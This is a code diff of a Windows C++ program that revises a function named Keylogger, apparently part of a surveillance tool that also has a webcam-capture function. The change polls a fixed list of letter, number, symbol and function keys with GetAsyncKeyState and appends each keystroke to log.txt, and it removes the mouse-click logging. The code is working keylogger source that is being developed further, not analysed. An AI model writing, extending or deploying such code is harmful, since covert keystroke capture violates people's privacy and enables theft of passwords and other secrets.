@@ -328,17 +328,29 @@ bool webCam(const string& input, string& filename) {
 }
 
 bool Keylogger(const string& input, string& filename) {
-    filename = "log.txt";
-    ofstream logFile(filename);
+    ofstream logFile("log.txt", ios::app);
     if (!logFile.is_open()) {
         cerr << "Cannot open log file!" << endl;
         return false;
     }
 
+    filename = "log.txt";
     auto lastKeyPressTime = chrono::steady_clock::now();
 
+    // Relevant keys to check
+    const int keysToCheck[] = {
+        VK_SPACE, VK_ESCAPE, VK_RETURN, VK_TAB, VK_SHIFT, VK_CONTROL,
+        VK_MENU, VK_CAPITAL, VK_LEFT, VK_RIGHT, VK_UP, VK_DOWN,
+        0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, // Numbers
+        'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M',
+        'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', // Letters
+        VK_OEM_PLUS, VK_OEM_MINUS, VK_OEM_5, VK_OEM_7, VK_OEM_COMMA,
+        VK_OEM_PERIOD, VK_OEM_1, VK_OEM_2, VK_OEM_3, VK_LWIN,
+        VK_F1, VK_F2, VK_F3, VK_F4, VK_F5, VK_F6, VK_F7, VK_F8, VK_F9, VK_F10, VK_F11, VK_F12
+    };
+
     while (true) {
-        for (int key = 8; key <= 255; ++key) {
+        for (int key : keysToCheck) {
             SHORT keyState = GetAsyncKeyState(key);
             if (keyState & 0x0001) {  // Check if the key was just pressed
                 string keyLog;
@@ -350,8 +362,6 @@ bool Keylogger(const string& input, string& filename) {
                 case VK_RETURN: keyLog = "[ENTER]"; break;
                 case VK_TAB: keyLog = "[TAB]"; break;
                 case VK_SHIFT: keyLog = "[SHIFT]"; break;
-                case VK_RBUTTON: keyLog = "[RIGHT_CLICK]"; break;
-                case VK_LBUTTON: keyLog = "[LEFT_CLICK]"; break;
                 case VK_CONTROL: keyLog = "[CTRL]"; break;
                 case VK_MENU: keyLog = "[ALT]"; break;
                 case VK_CAPITAL: keyLog = "[CAPS_LOCK]"; break;
